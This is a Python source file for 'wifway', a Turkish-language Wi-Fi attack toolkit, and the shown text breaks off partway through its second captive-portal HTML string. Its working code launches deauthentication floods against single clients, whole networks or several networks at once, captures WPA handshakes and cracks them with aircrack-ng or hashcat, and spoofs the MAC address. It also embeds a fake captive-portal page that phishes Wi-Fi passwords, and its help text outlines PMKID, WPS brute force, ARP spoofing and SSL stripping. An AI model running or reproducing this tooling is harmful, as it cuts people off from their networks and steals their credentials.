#!/usr/bin/env python3
# wifway — Wi-Fi Ağ Tarama & Analiz Aracı

import subprocess, time, csv, os, json, random, string
import threading, datetime, shutil
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote_plus
import sys, platform

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box
from rich.align import Align
from rich.rule import Rule

console = Console()

BANNER = """
██╗    ██╗██╗███████╗██╗    ██╗ █████╗ ██╗   ██╗
██║    ██║██║██╔════╝██║    ██║██╔══██╗╚██╗ ██╔╝
██║ █╗ ██║██║█████╗  ██║ █╗ ██║███████║ ╚████╔╝ 
██║███╗██║██║██╔══╝  ██║███╗██║██╔══██║  ╚██╔╝  
╚███╔███╔╝██║██║     ╚███╔███╔╝██║  ██║   ██║   
 ╚══╝╚══╝ ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝  
"""

INTERFACE        = "wlan0"
MON_IFACE        = INTERFACE + "mon"
SCAN_DIR         = Path("scan_results")
LOG_DIR          = Path("logs")
CSV_PREFIX       = str(SCAN_DIR / "scan_capture")
TELEGRAM_TOKEN   = ""
TELEGRAM_CHAT_ID = ""
DISCORD_WEBHOOK  = ""

# ══════════════════════════════════════════════════════════════════════
#  UI YARDIMCI
# ══════════════════════════════════════════════════════════════════════

def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

def ensure_dirs():
    SCAN_DIR.mkdir(exist_ok=True)
    LOG_DIR.mkdir(exist_ok=True)

def show_banner():
    clear_screen()
    console.print(Align.center(Panel(
        Text(BANNER, style="bold green", justify="center"),
        subtitle="[dim cyan]Wi-Fi Ağ Tarama & Analiz Aracı[/]",
        border_style="green", padding=(0, 4),
    )))
    console.print(Rule(style="dim green"))
    console.print()

def status(msg):  console.print(f"  [bold green]›[/] {msg}")
def success(msg): console.print(f"  [bold green]✔[/] [green]{msg}[/]")
def warn(msg):    console.print(f"  [bold yellow]⚠[/]  [yellow]{msg}[/]")
def error(msg):   console.print(f"  [bold red]✘[/] [red]{msg}[/]")
def info(msg):    console.print(f"  [dim]ℹ  {msg}[/]")

def section(title):
    console.print()
    console.print(Rule(f"[bold green] {title} [/]", style="dim green"))
    console.print()

def safe_input(prompt):
    try:
        return Prompt.ask(f"\n  [bold green]›[/] {prompt}")
    except KeyboardInterrupt:
        console.print()
        warn("Ctrl+C algılandı.")
        try:
            ans = Prompt.ask("  Çıkmak istiyor musunuz? [bold](e/h)[/]").strip().lower()
        except KeyboardInterrupt:
            ans = "e"
        if ans == "e":
            try: disable_monitor_mode()
            except Exception: pass
            console.print(Panel("[bold red]Çıkış yapıldı.[/]", border_style="red"))
            sys.exit(0)
        info("Devam ediliyor...")
        return ""

def tool_check(tool):
    """Araç yüklü mü kontrol et, yoksa uyar."""
    if not shutil.which(tool):
        warn(f"'{tool}' bulunamadı. Kurmak için: [cyan]sudo apt install {tool} -y[/]")
        return False
    return True

# ══════════════════════════════════════════════════════════════════════
#  LOG
# ══════════════════════════════════════════════════════════════════════

def log_event(event_type, data):
    try:
        log_file = LOG_DIR / f"wifway_{datetime.date.today()}.json"
        entry = {"timestamp": datetime.datetime.now().isoformat(),
                 "event": event_type, "data": data}
        existing = []
        if log_file.exists():
            try: existing = json.loads(log_file.read_text())
            except Exception: existing = []
        existing.append(entry)
        log_file.write_text(json.dumps(existing, indent=2, ensure_ascii=False))
    except Exception as e:
        warn(f"Log kaydedilemedi: {e}")

# ══════════════════════════════════════════════════════════════════════
#  BİLDİRİM
# ══════════════════════════════════════════════════════════════════════

def send_notification(msg):
    if not HAS_REQUESTS:
        return
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID, "text": f"[wifway]\n{msg}"},
                timeout=5)
            success("Telegram bildirimi gönderildi.")
        except Exception as e:
            warn(f"Telegram hatası: {e}")
    if DISCORD_WEBHOOK:
        try:
            requests.post(DISCORD_WEBHOOK,
                          json={"content": f"**[wifway]**\n{msg}"},
                          timeout=5)
            success("Discord bildirimi gönderildi.")
        except Exception as e:
            warn(f"Discord hatası: {e}")

def menu_notification_settings():
    section("Bildirim Ayarları")
    global TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, DISCORD_WEBHOOK
    table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    table.add_column(style="bold yellow", width=4)
    table.add_column(style="white")
    table.add_row("1", f"Telegram Token  [dim]({'✔' if TELEGRAM_TOKEN else '✘'})[/]")
    table.add_row("2", f"Discord Webhook [dim]({'✔' if DISCORD_WEBHOOK else '✘'})[/]")
    table.add_row("3", "Test bildirimi gönder")
    table.add_row("0", "Geri dön")
    console.print(table)
    choice = safe_input("Seçiminiz").strip()
    if choice == "1":
        TELEGRAM_TOKEN   = safe_input("Telegram Bot Token").strip()
        TELEGRAM_CHAT_ID = safe_input("Telegram Chat ID").strip()
        success("Telegram ayarlandı.")
    elif choice == "2":
        DISCORD_WEBHOOK = safe_input("Discord Webhook URL").strip()
        success("Discord ayarlandı.")
    elif choice == "3":
        send_notification("Test — wifway çalışıyor.")

# ══════════════════════════════════════════════════════════════════════
#  YARDIM / AÇIKLAMALAR
# ══════════════════════════════════════════════════════════════════════

HELP_TEXT = {
    "deauth_single": (
        "Deauth — Belirli İstemciye",
        "Seçtiğiniz tek bir cihazın ağ bağlantısını keser.\n"
        "aireplay-ng ile hedef cihaza deauthentication paketi gönderir.\n"
        "Gerekli: aircrack-ng paketi."
    ),
    "deauth_all": (
        "Deauth — Tüm Ağa",
        "Seçili ağa bağlı TÜM cihazların bağlantısını sürekli keser.\n"
        "Broadcast deauth paketi gönderir. '-0 0' = sınırsız.\n"
        "Gerekli: aircrack-ng paketi."
    ),
    "bulk_deauth": (
        "Toplu Deauth",
        "Aynı anda birden fazla ağa deauth saldırısı başlatır.\n"
        "Her ağ için ayrı xterm penceresi açılır.\n"
        "Gerekli: aircrack-ng paketi."
    ),
    "handshake": (
        "Handshake Yakalama",
        "WPA/WPA2 şifresini kırmak için önce 4-way handshake yakalanır.\n"
        "Bir cihazı ağdan atıp yeniden bağlanmasını tetikler.\n"
        "Yakalanan .cap dosyası aircrack-ng veya hashcat ile kırılabilir.\n"
        "Gerekli: aircrack-ng, hashcat (GPU kırma için), cap2hccapx/hcxtools."
    ),
    "evil_twin": (
        "Evil Twin + Captive Portal",
        "Hedef ağın birebir kopyasını oluşturur.\n"
        "Gerçek ağa deauth göndererek cihazların sahte ağa bağlanmasını sağlar.\n"
        "Captive Portal açıksa, bağlanan kullanıcıya sahte giriş sayfası gösterilir\n"
        "ve girilen şifre yakalanır.\n"
        "Gerekli: hostapd, dnsmasq."
    ),
    "wps": (
        "WPS PIN Saldırısı",
        "WPS açık modemlerde 8 haneli PIN'i deneme yanılma ile kırar.\n"
        "Pixie Dust: bazı modellerde anlık açık kullanarak saniyeler içinde kırar.\n"
        "Normal: tüm kombinasyonları dener (saatler/günler sürebilir).\n"
        "Gerekli: reaver."
    ),
    "pmkid": (
        "PMKID Saldırısı",
        "Handshake'e modern alternatif. Hiç istemci bağlantısı beklemeden\n"
        "doğrudan AP'den PMKID hash'i alır ve hashcat ile kırmayı dener.\n"
        "Gerekli: hcxdumptool, hcxtools, hashcat."
    ),
    "wpa_enterprise": (
        "WPA Enterprise Saldırısı",
        "Kurumsal ağlarda (eduroam, şirket Wi-Fi) kullanıcı adı/şifre ile\n"
        "kimlik doğrulama yapılır. Sahte RADIUS sunucusu kurarak\n"
        "bağlanan kullanıcıların hash'lerini yakalar.\n"
        "Gerekli: hostapd-wpe."
    ),
    "os_fp": (
        "OS Fingerprinting",
        "Ağdaki cihazların işletim sistemini tahmin eder.\n"
        "nmap -O ve servis tespiti kullanır. Managed mod gerekir.\n"
        "Önce arp -a veya nmap -sn ile IP bulun, sonra tarayın.\n"
        "Gerekli: nmap."
    ),
    "probe": (
        "Probe Request Dinleme",
        "Civarınızdaki cihazların daha önce bağlandığı ağlara otomatik\n"
        "'burada mısın?' diye sorduğu paketleri yakalar.\n"
        "Cihazın ağ geçmişini ortaya çıkarır.\n"
        "Gerekli: tshark (wireshark paketi)."
    ),
    "arp": (
        "ARP Spoofing / MITM",
        "Hedef cihaz ile router arasına girerek trafiği üzerinizden geçirir.\n"
        "IP forwarding açıkken trafik kesilmez, sadece izlenir/manipüle edilir.\n"
        "SSL Strip veya tcpdump ile birlikte kullanılır.\n"
        "Gerekli: arpspoof (dsniff paketi)."
    ),
    "ssl": (
        "SSL Stripping",
        "HTTPS bağlantılarını HTTP'ye düşürür.\n"
        "ARP Spoof ile birlikte çalışır; hedefin şifreli trafiğini açık hale getirir.\n"
        "Gerekli: sslstrip, iptables."
    ),
    "cve": (
        "CVE / Zafiyet Tarama",
        "nmap NSE scriptleri ile ağdaki cihazlarda bilinen güvenlik açıklarını tarar.\n"
        "SMB, HTTP, servis bazlı CVE tespiti yapabilir.\n"
        "Gerekli: nmap (güncel NSE scriptleri)."
    ),
    "bluetooth": (
        "Bluetooth Tarama",
        "Çevredeki Bluetooth cihazlarını tespit eder.\n"
        "hcitool ile klasik BT, bluetoothctl ile BLE cihazlar taranır.\n"
        "L2Ping ile cihaz varlığı doğrulanabilir.\n"
        "Gerekli: bluez paketi (hcitool, bluetoothctl, l2ping)."
    ),
    "channel_hop": (
        "Kanal Atlama",
        "Wi-Fi kartını tüm kanalları sırayla tarayacak şekilde ayarlar.\n"
        "Tek kanalda sabit kalmak yerine daha fazla ağ ve cihaz tespit edilir.\n"
        "Gerekli: aircrack-ng."
    ),
    "beacon": (
        "Beacon Flood",
        "Yüzlerce sahte Wi-Fi ağı adı yayınlar.\n"
        "Çevredeki cihazların ağ listesini kaotik hale getirir.\n"
        "3 mod: artan isimler, sabit Türk operatör listesi, rastgele.\n"
        "Gerekli: mdk4."
    ),
    "mac": (
        "MAC Adresi Değiştirme",
        "Wi-Fi kartının MAC adresini sahte bir adresle değiştirir.\n"
        "Ağ loglarında gerçek kimliğinizin görünmesini engeller.\n"
        "Gerekli: ip komutu (iproute2), geri alma için macchanger."
    ),
    "wordlist": (
        "Wordlist Üretici",
        "ESSID, anahtar kelime ve yıl kombinasyonlarından akıllı wordlist üretir.\n"
        "Türkiye'de yaygın Wi-Fi şifre kalıplarını kapsar.\n"
        "İsteğe bağlı crunch ile ek liste oluşturulabilir.\n"
        "Gerekli: crunch (opsiyonel)."
    ),
    "automation": (
        "Otomasyon Modu",
        "Seçtiğiniz adımları sırayla otomatik çalıştırır.\n"
        "Deauth → Handshake → PMKID → WPS → OS Fingerprint\n"
        "İstediğiniz adımları seçerek özelleştirebilirsiniz."
    ),
    "data_mgmt": (
        "Veri Yönetimi",
        "scan_results/ ve logs/ klasörlerindeki dosyaları listeler ve siler.\n"
        "Tarama geçmişi, CSV dosyaları, cap dosyaları ve loglar yönetilebilir."
    ),
}

def show_help(key):
    if key not in HELP_TEXT:
        return
    title, text = HELP_TEXT[key]
    console.print(Panel(text, title=f"[bold cyan]ℹ  {title}[/]",
                        border_style="cyan", padding=(1, 3)))

def menu_help():
    section("Yardım — Tüm Seçenekler")
    keys = list(HELP_TEXT.keys())
    table = Table(box=box.SIMPLE_HEAVY, border_style="green",
                  header_style="bold green")
    table.add_column("#",     style="bold yellow", width=4)
    table.add_column("Özellik", style="bold white")
    for i, k in enumerate(keys, 1):
        table.add_row(str(i), HELP_TEXT[k][0])
    console.print(table)

    choice = safe_input("Detay görmek için numara girin [dim](0=geri)[/]").strip()
    if choice == "0":
        return
    try:
        show_help(keys[int(choice) - 1])
        safe_input("Devam için Enter")
    except (ValueError, IndexError):
        warn("Geçersiz seçim.")

# ══════════════════════════════════════════════════════════════════════
#  VERİ YÖNETİMİ (SİLME)
# ══════════════════════════════════════════════════════════════════════

def menu_data_management():
    section("Veri Yönetimi")

    while True:
        # Klasör boyutlarını hesapla
        def dir_size(p):
            if not p.exists(): return "0 KB"
            total = sum(f.stat().st_size for f in p.rglob("*") if f.is_file())
            return f"{total/1024:.1f} KB" if total < 1048576 else f"{total/1048576:.1f} MB"

        table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
        table.add_column(style="bold yellow", width=4)
        table.add_column(style="white")
        table.add_column(style="dim cyan", width=12)
        table.add_row("1", "Tarama dosyalarını listele (scan_results/)", dir_size(SCAN_DIR))
        table.add_row("2", "Log dosyalarını listele (logs/)", dir_size(LOG_DIR))
        table.add_row("3", "Tüm CSV dosyalarını sil", "")
        table.add_row("4", "Tüm .cap / .pcapng dosyalarını sil", "")
        table.add_row("5", "Tarama geçmişini sil (scan_history.json)", "")
        table.add_row("6", "Tüm log dosyalarını sil", "")
        table.add_row("7", "HERŞEYİ sil (scan_results + logs)", "[bold red]DİKKAT[/]")
        table.add_row("0", "Geri dön", "")
        console.print(table)

        choice = safe_input("Seçiminiz").strip()

        if choice == "0":
            break

        elif choice == "1":
            _list_files(SCAN_DIR)

        elif choice == "2":
            _list_files(LOG_DIR)

        elif choice == "3":
            _delete_by_pattern(SCAN_DIR, "*.csv", "CSV")

        elif choice == "4":
            _delete_by_pattern(SCAN_DIR, "*.cap", "CAP")
            _delete_by_pattern(SCAN_DIR, "*.pcapng", "PCAPNG")
            _delete_by_pattern(SCAN_DIR, "*.hccapx", "HCCAPX")
            _delete_by_pattern(SCAN_DIR, "*.hc22000", "HC22000")

        elif choice == "5":
            f = SCAN_DIR / "scan_history.json"
            if f.exists():
                ans = safe_input("Tarama geçmişi silinsin mi? [bold](e/h)[/]").strip().lower()
                if ans == "e":
                    f.unlink()
                    success("Tarama geçmişi silindi.")
            else:
                warn("Geçmiş dosyası bulunamadı.")

        elif choice == "6":
            _delete_by_pattern(LOG_DIR, "*.json", "LOG")

        elif choice == "7":
            ans = safe_input(
                "[bold red]TÜM tarama ve log dosyaları silinecek![/] Emin misiniz? [bold](evet/hayir)[/]"
            ).strip().lower()
            if ans == "evet":
                shutil.rmtree(SCAN_DIR, ignore_errors=True)
                shutil.rmtree(LOG_DIR, ignore_errors=True)
                ensure_dirs()
                success("Tüm veriler silindi. Klasörler yeniden oluşturuldu.")
            else:
                info("İptal edildi.")

def _list_files(directory):
    if not directory.exists():
        warn("Klasör bulunamadı.")
        return
    files = sorted(directory.rglob("*"))
    files = [f for f in files if f.is_file()]
    if not files:
        warn("Klasör boş.")
        return
    table = Table(box=box.SIMPLE_HEAVY, border_style="dim green",
                  header_style="bold green")
    table.add_column("Dosya", style="cyan")
    table.add_column("Boyut", style="yellow", justify="right", width=10)
    table.add_column("Tarih", style="dim white", width=20)
    for f in files:
        size = f.stat().st_size
        size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
        mtime = datetime.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        table.add_row(f.name, size_str, mtime)
    console.print(table)

def _delete_by_pattern(directory, pattern, label):
    files = list(directory.glob(pattern))
    if not files:
        warn(f"{label} dosyası bulunamadı.")
        return
    info(f"{len(files)} adet {label} dosyası bulundu.")
    ans = safe_input(f"Tümü silinsin mi? [bold](e/h)[/]").strip().lower()
    if ans == "e":
        for f in files:
            f.unlink()
        success(f"{len(files)} {label} dosyası silindi.")
    else:
        info("İptal edildi.")

# ══════════════════════════════════════════════════════════════════════
#  MONITOR MOD
# ══════════════════════════════════════════════════════════════════════

def enable_monitor_mode():
    section("Monitor Mod Etkinleştiriliyor")
    if not tool_check("airmon-ng"): return
    status(f"airmon-ng start {INTERFACE} çalıştırılıyor...")
    subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    success(f"Monitor mod → [bold cyan]{MON_IFACE}[/]")
    log_event("monitor_mode", {"action": "start", "interface": MON_IFACE})

def disable_monitor_mode():
    section("Monitor Mod Kapatılıyor")
    subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    success("Monitor mod kapatıldı.")
    log_event("monitor_mode", {"action": "stop"})

# ══════════════════════════════════════════════════════════════════════
#  MAC SPOOFING
# ══════════════════════════════════════════════════════════════════════

def _active_iface():
    """Monitor mod varsa wlan0mon, yoksa wlan0 döndür."""
    r = subprocess.run(["ip", "link", "show", MON_IFACE],
                       capture_output=True)
    return MON_IFACE if r.returncode == 0 else INTERFACE

def change_mac(iface=None):
    section("MAC Adresi Değiştirme")
    iface = iface or _active_iface()
    rand_mac = "02:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(5))
    info(f"Arayüz: [cyan]{iface}[/]   Yeni MAC: [cyan]{rand_mac}[/]")
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=False)
    r = subprocess.run(["sudo", "ip", "link", "set", iface, "address", rand_mac],
                       capture_output=True, text=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=False)
    if r.returncode != 0:
        error(f"MAC değiştirilemedi: {r.stderr.strip()}")
    else:
        success(f"MAC değiştirildi → [cyan]{rand_mac}[/]")
        log_event("mac_spoof", {"interface": iface, "new_mac": rand_mac})

def restore_mac(iface=None):
    iface = iface or _active_iface()
    if not tool_check("macchanger"):
        return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=False)
    subprocess.run(["sudo", "macchanger", "-p", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=False)
    success(f"MAC orijinaline döndürüldü. Arayüz: [cyan]{iface}[/]")

# ══════════════════════════════════════════════════════════════════════
#  XTERM
# ══════════════════════════════════════════════════════════════════════

def run_command_in_xterm(command, title, fg="green", wait=False):
    if wait:
        bash_cmd = (f"sudo {command} ; "
                    f"echo '' ; "
                    f"echo '══ Tamamlandı ══  Çıkmak için Enter.' ; "
                    f"read")
    else:
        bash_cmd = f"sudo {command}"
    proc = subprocess.Popen([
        "xterm", "-bg", "black", "-fg", fg,
        "-fa", "Monospace", "-fs", "11",
        "-title", title,
        "-e", "bash", "-c", bash_cmd
    ])
    status(f"[bold]{title}[/] → xterm açıldı.")
    return proc

# ══════════════════════════════════════════════════════════════════════
#  CSV
# ══════════════════════════════════════════════════════════════════════

def get_latest_csv(prefix=CSV_PREFIX, timeout=10):
    deadline = time.time() + timeout
    with Progress(SpinnerColumn(style="green"),
                  TextColumn("[cyan]CSV aranıyor..."), transient=True) as p:
        p.add_task("", total=None)
        while time.time() < deadline:
            # Prefix ile eşleşen dosyaları ara
            files = list(Path(".").glob(f"{prefix}*.csv"))
            if not files:
                # Fallback: scan_results içinde ara
                files = list(SCAN_DIR.glob("*.csv"))
            if files:
                return max(files, key=os.path.getmtime)
            time.sleep(0.5)
    return None

def parse_csv_aps(csv_file):
    aps = []
    if not csv_file: return aps
    with open(csv_file, newline="", encoding="utf-8", errors="replace") as f:
        for row in csv.reader(f):
            if not row: continue
            if row[0].strip() == "Station MAC": break
            fc = row[0].strip()
            if len(fc.split(":")) == 6 and len(fc) == 17:
                essid = (",".join(row[13:]).strip().strip('"')
                         if len(row) >= 14 else row[-1].strip().strip('"'))
                aps.append({
                    "bssid":   fc,
                    "channel": row[3].strip() if len(row) > 3 else "?",
                    "power":   row[8].strip() if len(row) > 8 else "?",
                    "enc":     row[5].strip() if len(row) > 5 else "?",
                    "essid":   essid or "<Gizli Ağ>",
                })
    return aps

def get_clients_of_ap(csv_path, bssid):
    clients = []
    if not csv_path or not Path(csv_path).exists(): return clients
    with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
        sec = "aps"
        for row in csv.reader(f):
            if not row: continue
            if row[0].strip() == "Station MAC":
                sec = "clients"; continue
            if sec == "clients":
                mac = row[0].strip()
                if len(mac.split(":")) != 6: continue
                clients.append({
                    "mac":    mac,
                    "bssid":  row[5].strip() if len(row) > 5 else "",
                    "probed": ",".join(row[6:]).strip().strip('"') if len(row) > 6 else "",
                })
    return [c for c in clients if c["bssid"] == bssid]

# ══════════════════════════════════════════════════════════════════════
#  TARAMA GEÇMİŞİ
# ══════════════════════════════════════════════════════════════════════

def save_scan_history(aps):
    hf = SCAN_DIR / "scan_history.json"
    existing = []
    if hf.exists():
        try: existing = json.loads(hf.read_text())
        except Exception: existing = []
    existing.append({"timestamp": datetime.datetime.now().isoformat(), "aps": aps})
    hf.write_text(json.dumps(existing, indent=2, ensure_ascii=False))
    success(f"Tarama geçmişe kaydedildi → [dim]{hf}[/]")

def load_scan_history():
    hf = SCAN_DIR / "scan_history.json"
    if not hf.exists():
        warn("Kayıtlı tarama yok.")
        return []
    try:
        data = json.loads(hf.read_text())
        if not data: warn("Geçmiş boş."); return []
        section("Tarama Geçmişi")
        table = Table(box=box.SIMPLE_HEAVY, border_style="green",
                      header_style="bold green")
        table.add_column("#",    style="bold yellow", width=4)
        table.add_column("Tarih",  style="cyan", width=22)
        table.add_column("Ağ Sayısı", style="white", width=10)
        for i, e in enumerate(data, 1):
            table.add_row(str(i), e["timestamp"], str(len(e["aps"])))
        console.print(table)
        idx = safe_input("Yüklenecek numara").strip()
        aps = data[int(idx)-1]["aps"]
        success(f"{len(aps)} ağ yüklendi.")
        list_aps(aps)
        return aps
    except Exception as e:
        error(f"Geçmiş okunamadı: {e}")
        return []

# ══════════════════════════════════════════════════════════════════════
#  TABLOLAR
# ══════════════════════════════════════════════════════════════════════

def list_aps(aps):
    section("Bulunan Ağlar")
    t = Table(box=box.SIMPLE_HEAVY, border_style="green",
              header_style="bold green", show_lines=False)
    t.add_column("#",     style="bold yellow", justify="right", width=4)
    t.add_column("BSSID", style="cyan",        width=19)
    t.add_column("CH",    style="magenta",     justify="center", width=5)
    t.add_column("PWR",   style="yellow",      justify="center", width=6)
    t.add_column("ENC",   style="red",         width=8)
    t.add_column("ESSID", style="bold white")
    for i, ap in enumerate(aps, 1):
        t.add_row(str(i), ap["bssid"], ap["channel"],
                  ap.get("power","?"), ap.get("enc","?"), ap["essid"])
    console.print(t)

def list_clients(clients):
    section("Bağlı İstemciler")
    t = Table(box=box.SIMPLE_HEAVY, border_style="green",
              header_style="bold green", show_lines=False)
    t.add_column("#",   style="bold yellow", justify="right", width=4)
    t.add_column("MAC", style="cyan",  width=19)
    t.add_column("Probed SSIDs", style="dim white")
    for i, c in enumerate(clients, 1):
        t.add_row(str(i), c["mac"], c["probed"] or "—")
    console.print(t)

def select_aps(aps):
    while True:
        sel = Prompt.ask(
            "\n  [bold green]›[/] Ağ numaralarını seçin [dim](virgülle, örn: 1,3)[/]"
        ).strip()
        if not sel: warn("İptal."); return []
        try:
            nums = [int(x.strip()) for x in sel.split(",")]
            selected = [aps[n-1] for n in nums if 1 <= n <= len(aps)]
            if selected: return selected
            warn("Geçersiz seçim.")
        except (ValueError, IndexError):
            warn("Sadece numara girin.")

# ══════════════════════════════════════════════════════════════════════
#  1. DEAUTH
# ══════════════════════════════════════════════════════════════════════

def _deauth_client(ap, clients):
    show_help("deauth_single")
    if not clients:
        warn("İstemci listesi boş.")
        return
    idx = safe_input("İstemci numarası").strip()
    try:
        client = clients[int(idx)-1]
        count  = safe_input("Paket sayısı [dim](örn: 100)[/]").strip() or "100"
        cmd = f"aireplay-ng --deauth {count} -a {ap['bssid']} -c {client['mac']} {MON_IFACE}"
        run_command_in_xterm(cmd, f"Deauth: {ap['essid']}", fg="red")
        log_event("deauth", {"target": ap["bssid"], "client": client["mac"], "packets": count})
        send_notification(f"Deauth → {ap['essid']} / {client['mac']}")
    except (ValueError, IndexError):
        warn("Geçersiz seçim.")

def _deauth_all(ap):
    show_help("deauth_all")
    cmd = f"aireplay-ng -0 0 -a {ap['bssid']} {MON_IFACE}"
    run_command_in_xterm(cmd, f"Deauth Tüm: {ap['essid']}", fg="red")
    log_event("deauth_all", {"target": ap["bssid"]})
    send_notification(f"Tüm ağa deauth → {ap['essid']}")

def _bulk_deauth(aps):
    show_help("bulk_deauth")
    procs = []
    for ap in aps:
        cmd = f"aireplay-ng -0 0 -a {ap['bssid']} {MON_IFACE}"
        p = subprocess.Popen([
            "xterm", "-bg", "black", "-fg", "red",
            "-fa", "Monospace", "-fs", "10",
            "-title", f"Deauth: {ap['essid']}",
            "-e", "bash", "-c", f"sudo {cmd}"
        ])
        procs.append(p)
        success(f"→ [cyan]{ap['essid']}[/] ({ap['bssid']})")
    log_event("bulk_deauth", {"targets": [a["bssid"] for a in aps]})
    send_notification(f"Toplu deauth: {len(aps)} ağa saldırı başladı.")
    info("Durdurmak için [bold]Enter[/]'a basın.")
    try: input()
    except KeyboardInterrupt: pass
    for p in procs:
        try: p.terminate()
        except Exception: pass

# ══════════════════════════════════════════════════════════════════════
#  2. HANDSHAKE + ŞİFRE KIRMA
# ══════════════════════════════════════════════════════════════════════

def _pick_wordlist():
    """Wordlist seçim menüsü — mevcut olanları göster."""
    builtin = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
        str(SCAN_DIR / "custom_wordlist.txt"),
    ]
    section("Wordlist Seçimi")
    for i, w in enumerate(builtin, 1):
        exists = Path(w).exists()
        mark = "[green]✔[/]" if exists else "[red]✘[/]"
        console.print(f"  [bold yellow]{i}.[/] {mark} {w}")
    console.print(f"  [bold yellow]{len(builtin)+1}.[/] [cyan]Manuel yol gir[/]")

    choice = safe_input("Seçiminiz").strip()
    try:
        i = int(choice) - 1
        if i == len(builtin):
            wl = safe_input("Wordlist tam yolu").strip()
        else:
            wl = builtin[i]
    except (ValueError, IndexError):
        wl = choice

    if not Path(wl).exists():
        error(f"Wordlist bulunamadı: {wl}")
        return None
    return wl

def _handshake_capture(ap, clients):
    show_help("handshake")
    if not tool_check("airodump-ng"): return
    cap_file = str(SCAN_DIR / f"hs_{ap['bssid'].replace(':','_')}")
    info(f"Çıktı: [cyan]{cap_file}-01.cap[/]")

    dump_cmd = (f"airodump-ng --bssid {ap['bssid']} --channel {ap['channel']} "
                f"--output-format pcap --write {cap_file} {MON_IFACE}")
    dump_proc = run_command_in_xterm(dump_cmd, f"Handshake: {ap['essid']}")
    time.sleep(3)

    # Deauth tetikleme
    target_mac = clients[0]["mac"] if clients else None
    deauth_cmd = (f"aireplay-ng --deauth 10 -a {ap['bssid']}"
                  + (f" -c {target_mac}" if target_mac else "")
                  + f" {MON_IFACE}")
    run_command_in_xterm(deauth_cmd, "Handshake Tetikleme", fg="yellow")

    info("Handshake yakalandıktan sonra [bold]Enter[/]'a basın.")
    try: input()
    except KeyboardInterrupt: pass
    try: dump_proc.terminate(); dump_proc.wait(timeout=3)
    except Exception: dump_proc.kill()

    cap_path = Path(f"{cap_file}-01.cap")
    if not cap_path.exists():
        warn("Cap dosyası bulunamadı — handshake yakalanamadı olabilir.")
        return

    success(f"Handshake hazır: [cyan]{cap_path}[/]")
    log_event("handshake", {"target": ap["bssid"], "file": str(cap_path)})
    send_notification(f"Handshake yakalandı: {ap['essid']}")

    ans = safe_input("Şifre kırmayı dene? [bold](e/h)[/]").strip().lower()
    if ans != "e": return

    wl = _pick_wordlist()
    if not wl: return

    tool = safe_input("1) aircrack-ng (CPU)  2) hashcat (GPU)  0) İptal\nSeçiminiz").strip()
    if tool == "1":
        run_command_in_xterm(f"aircrack-ng {cap_path} -w {wl}",
                             f"aircrack: {ap['essid']}", fg="yellow", wait=True)
    elif tool == "2":
        hccapx = str(cap_path).replace(".cap", ".hc22000")
        r = subprocess.run(["sudo", "hcxpcapngtool", "-o", hccapx, str(cap_path)],
                           capture_output=True)
        if r.returncode != 0 or not Path(hccapx).exists():
            # fallback: cap2hccapx
            hccapx = str(cap_path).replace(".cap", ".hccapx")
            subprocess.run(["sudo", "cap2hccapx", str(cap_path), hccapx],
                           capture_output=True)
            mode = "2500"
        else:
            mode = "22000"
        if Path(hccapx).exists():
            run_command_in_xterm(f"hashcat -m {mode} {hccapx} {wl}",
                                 f"hashcat: {ap['essid']}", fg="yellow", wait=True)
        else:
            error("Hash dosyası oluşturulamadı. hcxtools veya cap2hccapx kurulu mu?")

# ══════════════════════════════════════════════════════════════════════
#  3. EVIL TWIN + CAPTIVE PORTAL
# ══════════════════════════════════════════════════════════════════════

CAPTIVE_PORTAL_HTML = b"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Wi-Fi Giris</title>
<style>
body{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;
     justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#16213e;padding:40px;border-radius:12px;text-align:center;width:320px}
h2{color:#00d4ff}
input{width:100%;padding:10px;margin:8px 0;border-radius:6px;
      border:1px solid #444;background:#0f3460;color:#eee;box-sizing:border-box}
button{width:100%;padding:12px;background:#00d4ff;color:#000;
       border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:10px}
p{font-size:12px;color:#aaa}
</style></head>
<body><div class="box">
<h2>Wi-Fi Aktivasyonu</h2>
<p>Aga baglanmak icin Wi-Fi sifrenizi girin.</p>
<form method="POST" action="/login">
  <input type="text"     name="ssid"     placeholder="Ag Adi" id="s" value="">
  <input type="password" name="password" placeholder="Wi-Fi Sifresi">
  <button type="submit">Baglan</button>
</form>
</div>
<script>
  var s=document.getElementById('s');
  if(s){s.value=document.title||'';}
</script>
</body></html>"""

CAPTIVE_SUCCESS_HTML = b"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Baglaniliyor</title></head>
